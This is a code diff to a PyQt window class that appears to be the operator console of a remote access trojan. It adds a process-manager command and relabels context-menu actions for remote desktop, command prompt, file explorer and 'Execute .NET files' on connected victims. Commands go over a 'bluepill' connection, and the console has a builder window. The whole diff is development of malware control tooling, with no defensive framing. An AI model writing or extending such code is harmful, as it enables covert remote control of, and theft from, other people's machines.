@@ -207,6 +207,7 @@ class MyWindow(QMainWindow):
         self.address = []
         self.command_window = []
         self.file_explorer = []
+        self.process_manager = []
         self.listening_connections = []
         # Set window properties
         dark_stylesheet = """
@@ -347,12 +348,13 @@ class MyWindow(QMainWindow):
         remove_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.remove_icon))))
         remote_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.remote_icon))))
         command_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.upload_icon))))
-        upload_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.upload_icon))))
-        remove_action = menu.addAction(remove_icon, "Remove Row")
-        remote_action = menu.addAction(remote_icon, "Remote")
+        folder_icon = QIcon(QPixmap("src/folder_icon.png"))
+        remove_action = menu.addAction(remove_icon, "Disconnect")
+        remote_action = menu.addAction(remote_icon, "Remote Desktop")
         command_action = menu.addAction(command_icon, "Command prompt")
-        file_explorer = menu.addAction(command_icon, "File Explorer")
-        executeFile = menu.addAction(command_icon, "Upload File")
+        file_explorer = menu.addAction(folder_icon, "File Explorer")
+        process_manager = menu.addAction(folder_icon, "Process Manager")
+        executeFile = menu.addAction(command_icon, "Execute .NET files")
         action = menu.exec_(self.table_widget.viewport().mapToGlobal(pos))
         if action == remove_action:
             row_id, row = self.get_row()
@@ -377,6 +379,8 @@ class MyWindow(QMainWindow):
             self.bluepill.send(b"dir->Unknown", self.connection[int(row_id)-1])
             self.file_explorer[int(row_id)-1] = FileExplorerApp(str(row_id), parent=self)
             self.file_explorer[int(row_id)-1].show()
+        elif action == process_manager:
+            self.bluepill.send(b"GETPIDS", self.connection[int(row_id)-1])
     def openBuilderWindow(self):
         builder_window = BuilderWindow(self)
         builder_window.show()
